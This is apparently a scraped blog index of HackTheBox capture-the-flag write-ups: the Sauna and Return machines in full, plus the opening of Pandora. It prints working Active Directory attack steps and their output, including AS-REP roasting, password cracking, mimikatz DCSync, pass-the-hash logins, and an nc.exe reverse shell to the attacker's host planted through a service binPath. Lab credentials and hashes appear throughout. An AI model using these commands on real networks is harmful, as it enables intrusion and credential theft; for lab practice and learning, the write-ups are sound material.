CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCALuSNCreated: 4099dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A==uSNChanged: 98336name: EGOTISTICAL-BANKobjectGUID:: 7AZOUMEioUOTwM9IB/gzYw==replUpToDateVector:: AgAAAAAAAAAGAAAAAAAAAEbG/1RIhXVKvwnC1AVq4o8WgAEAAAAAAM9av BsDAAAAq4zveNFJhUSywu2cZf6vrQzgAAAAAAAAKDj+FgMAAADc0VSB8WEuQrRECkAJ5oR1FXABAA AAAADUbg8XAwAAAP1ahZJG3l5BqlZuakAj9gwL0AAAAAAAANDwChUDAAAAm/DFn2wdfEWLFfovGj4 TThRgAQAAAAAAENUAFwMAAABAvuCzxiXsRLK5n/hcRLLsCbAAAAAAAADUBFIUAwAAAA==creationTime: 133502307364825316forceLogoff: -9223372036854775808lockoutDuration: -18000000000lockOutObservationWindow: -18000000000lockoutThreshold: 0maxPwdAge: -36288000000000minPwdAge: -864000000000minPwdLength: 7modifiedCountAtLastProm: 0nextRid: 1000pwdProperties: 1pwdHistoryLength: 24objectSid:: AQQAAAAAAAUVAAAA+o7VsIowlbg+rLZGserverState: 1uASCompat: 1modifiedCount: 1auditingPolicy:: AAE=nTMixedDomain: 0rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCALfSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name ,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCALsystemFlags: -1946157056wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOT ISTICAL-BANK,DC=LOCALwellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra m Data,DC=EGOTISTICAL-BANK,DC=LOCALwellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGO TISTICAL-BANK,DC=LOCALwellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin cipals,DC=EGOTISTICAL-BANK,DC=LOCALwellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC= EGOTISTICAL-BANK,DC=LOCALwellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=E GOTISTICAL-BANK,DC=LOCALwellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGO TISTICAL-BANK,DC=LOCALwellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTIC AL-BANK,DC=LOCALwellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers, DC=EGOTISTICAL-BANK,DC=LOCALwellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTIS TICAL-BANK,DC=LOCALwellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICA L-BANK,DC=LOCALobjectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,D C=LOCALisCriticalSystemObject: TRUEgPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syste m,DC=EGOTISTICAL-BANK,DC=LOCAL;0]dSCorePropagationData: 16010101000000.0ZotherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTIS TICAL-BANK,DC=LOCALotherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic e Accounts,DC=EGOTISTICAL-BANK,DC=LOCALmasteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN =Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCALms-DS-MachineAccountQuota: 10msDS-Behavior-Version: 7msDS-PerUserTrustQuota: 1msDS-AllUsersTrustQuota: 1000msDS-PerUserTrustTombstonesQuota: 10msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Na me,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCALmsDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-N ame,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCALmsDS-NcType: 0msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUEdc: EGOTISTICAL-BANK# Users, EGOTISTICAL-BANK.LOCALdn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL# Computers, EGOTISTICAL-BANK.LOCALdn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL# Domain Controllers, EGOTISTICAL-BANK.LOCALdn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL# System, EGOTISTICAL-BANK.LOCALdn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL# LostAndFound, EGOTISTICAL-BANK.LOCALdn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL# Infrastructure, EGOTISTICAL-BANK.LOCALdn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL# ForeignSecurityPrincipals, EGOTISTICAL-BANK.LOCALdn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL# Program Data, EGOTISTICAL-BANK.LOCALdn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL# NTDS Quotas, EGOTISTICAL-BANK.LOCALdn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL# Managed Service Accounts, EGOTISTICAL-BANK.LOCALdn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL# Keys, EGOTISTICAL-BANK.LOCALdn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL# TPM Devices, EGOTISTICAL-BANK.LOCALdn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL# Builtin, EGOTISTICAL-BANK.LOCALdn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL# Hugo Smith, EGOTISTICAL-BANK.LOCALdn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL# search referenceref: ldap://ForestDnsZones.EGOTISTICAL-BANK.LOCAL/DC=ForestDnsZones,DC=EGOTIST ICAL-BANK,DC=LOCAL# search referenceref: ldap://DomainDnsZones.EGOTISTICAL-BANK.LOCAL/DC=DomainDnsZones,DC=EGOTIST ICAL-BANK,DC=LOCAL# search referenceref: ldap://EGOTISTICAL-BANK.LOCAL/CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOC AL# search resultsearch: 2result: 0 Success# numResponses: 19# numEntries: 15# numReferences: 3```{: .nolineno}I noticed a username as `Hugo Smith` so lets move further and run kerbrute to userenum the usernames I used a wordlist of usernames `/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt`.```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Sauna]â””â”€$ kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc EGOTISTICAL-BANK.LOCAL /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / , Using KDC(s):2024/01/20 13:38:57 > \tEGOTISTICAL-BANK.LOCAL:882024/01/20 13:39:19 > [+] VALID USERNAME:\t administrator@EGOTISTICAL-BANK.LOCAL2024/01/20 13:41:18 > [+] VALID USERNAME:\t hsmith@EGOTISTICAL-BANK.LOCAL2024/01/20 13:41:38 > [+] VALID USERNAME:\t Administrator@EGOTISTICAL-BANK.LOCAL2024/01/20 13:42:44 > [+] VALID USERNAME:\t fsmith@EGOTISTICAL-BANK.LOCAL```{: .nolineno}I got this usernames `hsmith` and `fsmith` , so lets look for **`AS-REP Roasting`** through `GETNPUsers.py` Tool.```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Sauna]â””â”€$ GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile username.txt -request Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation[-] User hsmith doesnt have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:6e8a4d1c1806a981eb842a6278462d2c$9f760b243962dfa42eff1a4071b4b8909ef8b417110c1faec7d3f81ff2e3cf5ad51baa117419ee7368763ebccf74c27055a69f90199e401fecde7eda418d2c17e1cba21a07a681590e12f9b2fe45a9d7e31ca5b9efde72851fe7b0cb2eb4fb129756794c905e31f44df6f43d32befbca0c755297ddc75583e401dbfa122e47286c95e0d76e73ae2c43d491ddb4481aa945afedf3b057e7135c4bfa4c3c6c3c2c4fe321ed6c8ecc5558ea137c52e2756a201e9026c07e48c3cf302bac6a29ef8a5f37c15051145b365e6bee79ae31bd4dbc15def5d7d4f3097b3f0faa6da9a5f6a1d795590f6820eb1b2a0a1fdbdd1f1d0ddbf6cf397a1b075ceef443c8b786d5[-] User administrator does not have UF_DONT_REQUIRE_PREAUTH set[-] invalid principal syntax```{: .nolineno}Lets check this hash with john â†’```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Sauna]â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt Using default input encoding: UTF-8Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])Will run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusThestrokes23 ($krb5asrep$fsmith@EGOTISTICAL-BANK.LOCAL) 1g 0:00:00:15 DONE (2024-01-20 13:55) 0.06472g/s 682119p/s 682119c/s 682119C/s Thing..ThereisnospoonUse the \"--show\" option to display all of the cracked passwords reliablySession completed.```{: .nolineno}I have the password now â†’```bashfsmith : Thestrokes23```{: .nolineno}### WinRM Session â¤µï¸Lets see what access do this user have â†’![Untitled](Sauna/Untitled.png)Lets have a shell now â†’```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[/usr/share/wordlists/dirb/others]â””â”€$ evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23 Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\FSmith\\Documents> whoamiegotisticalbank\\fsmith*Evil-WinRM* PS C:\\Users\\FSmith\\Documents> hostnameSAUNA*Evil-WinRM* PS C:\\Users\\FSmith\\Documents> cd ..*Evil-WinRM* PS C:\\Users\\FSmith> tree /f /aFolder PATH listingVolume serial number is 489C-D8FCC:.+---Desktop| user.txt|+---Documents+---Downloads+---Favorites+---Links+---Music+---Pictures+---Saved Games\\---Videos*Evil-WinRM* PS C:\\Users\\FSmith>```{: .nolineno}Now I collected the Informations for BloodHound .```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Sauna]â””â”€$ python3 /opt/Tools/BloodHound.py/bloodhound.py -d 'EGOTISTICAL-BANK.LOCAL' -u fsmith -p 'Thestrokes23' -ns 10.10.10.175 -c allINFO: Found AD domain: egotistical-bank.localINFO: Getting TGT for userWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (SAUNA.EGOTISTICAL-BANK.LOCAL:88)] [Errno -2] Name or service not knownINFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCALINFO: Found 1 domainsINFO: Found 1 domains in the forestINFO: Found 1 computersINFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCALINFO: Found 7 usersINFO: Found 52 groupsINFO: Found 3 gposINFO: Found 1 ousINFO: Found 19 containersINFO: Found 0 trustsINFO: Starting computer enumeration with 10 workersINFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCALINFO: Done in 00M 24S```{: .nolineno}Now lets Inspect through bloodhound â†’![Untitled](Sauna/Untitled%201.png)But I canâ€™t have computer session so Lets enumerate further for that I uploaded WinPEAS.exe on the system â†’ I got credentials :![Untitled](Sauna/Untitled%202.png)Since this machine have these users â†’```powershell*Evil-WinRM* PS C:\\Users\\FSmith\\Documents> net userUser accounts for \\\\-------------------------------------------------------------------------------Administrator FSmith GuestHSmith krbtgt svc_loanmgrThe command completed with one or more errors.```{: .nolineno}```powershellsvc_loanmgr : Moneymakestheworldgoround!```{: .nolineno}Lets have a winrm session with these credentials â†’```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Sauna]â””â”€$ evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!' Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\svc_loanmgr\\Documents> whoamiegotisticalbank\\svc_loanmgr*Evil-WinRM* PS C:\\Users\\svc_loanmgr\\Documents>*Evil-WinRM* PS C:\\Users\\svc_loanmgr\\Documents> ls*Evil-WinRM* PS C:\\Users\\svc_loanmgr\\Documents>```{: .nolineno}Through Bloodhound I again collect the data as previous way and uploaded to bloodhound dashboad , Now â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Sauna]â””â”€$ python3 /opt/Tools/BloodHound.py/bloodhound.py -d 'EGOTISTICAL-BANK.LOCAL' -u svc_loanmgr -p 'Moneymakestheworldgoround!' -ns 10.10.10.175 -c allINFO: Found AD domain: egotistical-bank.localINFO: Getting TGT for userWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (SAUNA.EGOTISTICAL-BANK.LOCAL:88)] [Errno -2] Name or service not knownINFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCALINFO: Found 1 domainsINFO: Found 1 domains in the forestINFO: Found 1 computersINFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCALINFO: Found 7 usersINFO: Found 52 groupsINFO: Found 3 gposINFO: Found 1 ousINFO: Found 19 containersINFO: Found 0 trustsINFO: Starting computer enumeration with 10 workersINFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCALINFO: Done in 00M 29S```{: .nolineno}![Untitled](Sauna/Untitled%203.png)For **DCSync** Permission Abuse I need to upload mimikatz Tool â†’```powershell*Evil-WinRM* PS C:\\Users\\svc_loanmgr\\Documents> upload ../../../../../../opt/Tools/mimikatz.exe*Evil-WinRM* PS C:\\Users\\svc_loanmgr\\Documents> .\\mimikatz \"lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:Administrator\" exit '.#####.' mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36 '.## ^ ##.' \"A La Vie, A LAmour\" - (oe.eo) '## / \\ ##' /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) '## \\ / ##' > http://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > http://pingcastle.com / http://mysmartlogon.com ***/mimikatz(commandline) # lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:Administrator[DC] 'EGOTISTICAL-BANK.LOCAL' will be the domain[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server[DC] 'Administrator' will be the user accountObject RDN : Administrator** SAM ACCOUNT **SAM Username : AdministratorAccount Type : 30000000 ( USER_OBJECT )User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )Account expiration :Password last change : 7/26/2021 8:16:16 AMObject Security ID : S-1-5-21-2966785786-3096785034-1186376766-500Object Relative ID : 500Credentials: Hash NTLM: 823452073d75b9d1cf70ebdf86c7f98e ntlm- 0: 823452073d75b9d1cf70ebdf86c7f98e ntlm- 1: d9485863c1e9e05851aa40cbb4ab9dff ntlm- 2: 7facdc498ed1680c4fd1448319a8c04f lm - 0: 365ca60e4aba3e9a71d78a3912caf35c lm - 1: 7af65ae5e7103761ae828523c7713031Supplemental Credentials:* Primary:NTLM-Strong-NTOWF * Random Value : 716dbadeed0e537580d5f8fb28780d44* Primary:Kerberos-Newer-Keys * Default Salt : EGOTISTICAL-BANK.LOCALAdministrator Default Iterations : 4096 Credentials aes256_hmac (4096) : 42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657 aes128_hmac (4096) : a9f3769c592a8a231c3c972c4050be4e des_cbc_md5 (4096) : fb8f321c64cea87f OldCredentials aes256_hmac (4096) : 987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031 aes128_hmac (4096) : 145e4d0e4a6600b7ec0ece74997651d0 des_cbc_md5 (4096) : 19d5f15d689b1ce5 OlderCredentials aes256_hmac (4096) : 9637f48fa06f6eea485d26cd297076c5507877df32e4a47497f360106b3c95ef aes128_hmac (4096) : 52c02b864f61f427d6ed0b22639849df des_cbc_md5 (4096) : d9379d13f7c15d1c* Primary:Kerberos * Default Salt : EGOTISTICAL-BANK.LOCALAdministrator Credentials des_cbc_md5 : fb8f321c64cea87f OldCredentials des_cbc_md5 : 19d5f15d689b1ce5* Packages * NTLM-Strong-NTOWF* Primary:WDigest * 01 b4a06d28f92506a3a336d97a66b310fa 02 71efaf133c578bd7428bd2e1eca5a044 03 974acf4f67e4f609eb032fd9a72e8714 04 b4a06d28f92506a3a336d97a66b310fa 05 79ba561a664d78d6242748774e8475c5 06 f1188d8ed0ca1998ae828a60a8c6ac29 07 801ddc727db9fa3de98993d88a9ffa8b 08 a779e05da837dd2d303973304869ec0f 09 ac2c01846aebce4cbd4e3ec69b47a65d 10 6d863d6ae06c3addc49b7a453afe6fa0 11 a779e05da837dd2d303973304869ec0f 12 6676b9fdd4aa7f298f1ada64c044c230 13 5a01167d750636d66e5602db9aece9b7 14 f702282bd343c2fee7b98deac8950390 15 a099aa3c81f1affeba59d79a6533f60d 16 4bae84b8f0b0306788ff9bda4acb3bd4 17 976d547fb9e04b0ac5ec60508c275da1 18 50c302b71d0e08a1a2be14b56225645f 19 edb19e08653443695f6d3599e0a6bddf 20 c497465ddc6e2fc14cb0359d0d5de7f8 21 2ed0b4b57196fb190a66224b2b17029f 22 37d03051ae1cd6046975948564ab01fa 23 d4c7554fe1beb0ed712f50cfec470471 24 8df495fe69cdce409b9f04ea04289b9e 25 40788044be982310920cc0740687fefd 26 db7f66f1f1a8f46274d20cfdda5b6e1c 27 d70226ec52f1ef198c2e1e955a1da9b6 28 abdd681f875a9b3f3a50b36e51692a2c 29 dcd140a2ce2bf70fed7ac0e2b60d0deemimikatz(commandline) # exitBye!*Evil-WinRM* PS C:\\Users\\svc_loanmgr\\Documents>```{: .nolineno}Lets have a Adminstrators session now with ntlm hash â†’```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Sauna]â””â”€$ evil-winrm -i 10.10.10.175 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoamiegotisticalbank\\administrator*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cd ..*Evil-WinRM* PS C:\\Users\\Administrator> tree /f /aFolder PATH listingVolume serial number is 489C-D8FCC:.+---3D Objects+---Contacts+---Desktop| root.txt|+---Documents+---Downloads| z75198L13.exe|+---Favorites| | Bing.url| || \\---Links+---Links| Desktop.lnk| Downloads.lnk|+---Music+---Pictures+---Saved Games+---Searches\\---Videos*Evil-WinRM* PS C:\\Users\\Administrator> type Desktop\\root.txt8bcb632853e2f6cf8b3f5411fdb0ff65*Evil-WinRM* PS C:\\Users\\Administrator>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Return", "url": "/posts/Return/", "categories": "HackTheBox", "tags": "Active Directory, PrivEsc, Server Operators", "date": "2024-01-25 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Return]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.11.108 -PnStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-20 21:47...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Return]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.11.108 -PnStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-20 21:47 ISTNmap scan report for 10.10.11.108Host is up (0.17s latency).Not shown: 65509 closed tcp ports (reset)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0|_http-title: HTB Printer Admin Panel|_http-server-header: Microsoft-IIS/10.0| http-methods: |_ Potentially risky methods: TRACE88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-20 16:42:39Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.09389/tcp open mc-nmf .NET Message Framing47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49671/tcp open msrpc Microsoft Windows RPC49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049677/tcp open msrpc Microsoft Windows RPC49678/tcp open msrpc Microsoft Windows RPC49681/tcp open msrpc Microsoft Windows RPC49724/tcp open msrpc Microsoft Windows RPC52668/tcp open msrpc Microsoft Windows RPCService Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 11m45s| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required| smb2-time: | date: 2024-01-20T16:43:31|_ start_date: N/A```{: .nolineno}## Web Enumeration â¤µï¸I checked port 80 and I got this site â†’![Untitled](Return/Untitled%201.png)I looked into the `settings.php` page and found that some data is sent to that IP on that port so I changed the IP to my tun0 interface IP and I started listener at port 389 in my system.![Untitled](Return/Untitled%202.png)On netcat listener I got this â†’![Untitled](Return/Untitled%203.png)I got some data lets see it is a credential or not â†’![Untitled](Return/Untitled%204.png)Lets have a winrm shell â†’### Winrm Shell â¤µï¸I got this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Return]â””â”€$ evil-winrm -i 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!' Evil-WinRM shell v3.5 *Evil-WinRM* PS C:\\Users\\svc-printer\\Documents> ls*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents> cd ..*Evil-WinRM* PS C:\\Users\\svc-printer> whoamireturn\\svc-printer*Evil-WinRM* PS C:\\Users\\svc-printer> hostnameprinter*Evil-WinRM* PS C:\\Users\\svc-printer> tree /f /aFolder PATH listingVolume serial number is 3A0C-428EC:.+---Desktop| user.txt|+---Documents+---Downloads+---Favorites+---Links+---Music+---Pictures+---Saved Games\\---Videos*Evil-WinRM* PS C:\\Users\\svc-printer>```{: .nolineno}Lets see the privileges now â†’```bash*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents> whoami /allUSER INFORMATION----------------User Name SID================== ======================================return\\svc-printer S-1-5-21-3750359090-2939318659-876128439-1103GROUP INFORMATION-----------------Group Name Type SID Attributes========================================== ================ ============ ===========================================Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Server Operators Alias S-1-5-32-549 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Print Operators Alias S-1-5-32-550 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled groupMandatory Label\\High Mandatory Level Label S-1-16-12288PRIVILEGES INFORMATION----------------------Privilege Name Description State============================= =================================== SeMachineAccountPrivilege Add workstations to domain EnabledSeLoadDriverPrivilege Load and unload device drivers EnabledSeSystemtimePrivilege Change the system time EnabledSeBackupPrivilege Back up files and directories EnabledSeRestorePrivilege Restore files and directories EnabledSeShutdownPrivilege Shut down the system EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeRemoteShutdownPrivilege Force shutdown from a remote system EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledSeTimeZonePrivilege Change the time zone EnabledUSER CLAIMS INFORMATION-----------------------User claims unknown.Kerberos support for Dynamic Access Control on this device has been disabled.*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents>```{: .nolineno}Since this user is a part of BUILTIN\\Server Operators Group , Lets verify once more â†’```bash*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents> net user svc-printerUser name svc-printerFull Name SVCPrinterComment Service Account for PrinterUser's commentCountry/region code 000 (System Default)Account active YesAccount expires NeverPassword last set 5/26/2021 12:15:13 AMPassword expires NeverPassword changeable 5/27/2021 12:15:13 AMPassword required YesUser may change password YesWorkstations allowed AllLogon scriptUser profileHome directoryLast logon 1/20/2024 11:27:04 AMLogon hours allowed AllLocal Group Memberships *Print Operators *Remote Management Use *Server OperatorsGlobal Group memberships *Domain UsersThe command completed successfully.*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents>```{: .nolineno}So I have privilege to modify the configuration of a running service like this â†’```bash*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents> services```{: .nolineno}![Untitled](Return/Untitled%205.png)Lets modify the config path of this service VMTools like this :```bashupload /usr/share/windows-binaries/nc.exesc.exe config VMTools binPath=\"C:\\Users\\svc-printer\\Documents\\nc.exe -e cmd.exe 10.10.16.29 445\"sc.exe stop VMToolssc.exe start VMTools```{: .nolineno}![Untitled](Return/Untitled%206.png)Before running I made sure I was started my netcat listener so .Lets have a Administrator flag now â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Return]â””â”€$ rlwrap nc -lvnp 445listening on [any] 445 ...connect to [10.10.16.29] from (UNKNOWN) [10.10.11.108] 62385Microsoft Windows [Version 10.0.17763.107](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32>cd C:\\Users\\Administratorcd C:\\Users\\AdministratorC:\\Users\\Administrator>tree /f /atree /f /aFolder PATH listingVolume serial number is 3A0C-428EC:.+---3D Objects+---Contacts+---Desktop| root.txt| +---Documents+---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---VideosC:\\Users\\Administrator>type Desktop\\root.txttype Desktop\\root.txt5f193360338570c2550071c9f207183dC:\\Users\\Administrator>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Pandora", "url": "/posts/Pandora/", "categories": "HackTheBox", "tags": "Port Forwarding, PrivEsc, Public Exploit, RFI, SNMP, SUIDs, UDP", "date": "2024-01-25 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸In all scans I got the port 22,80 open only but though UDP scan I got the SNMP port as open port so lets see into it .```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pandora]â””â”€$ sudo ...", "content": "## Port Scan Results â¤µï¸In all scans I got the port 22,80 open only but though UDP scan I got the SNMP port as open port so lets see into it .```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pandora]â””â”€$ sudo nmap -sC -sV -T4 -oN Nmap_Result.txt 10.10.11.136 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-31 20:30 ISTNmap scan report for panda.htb (10.10.11.136)Host is up (0.34s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| 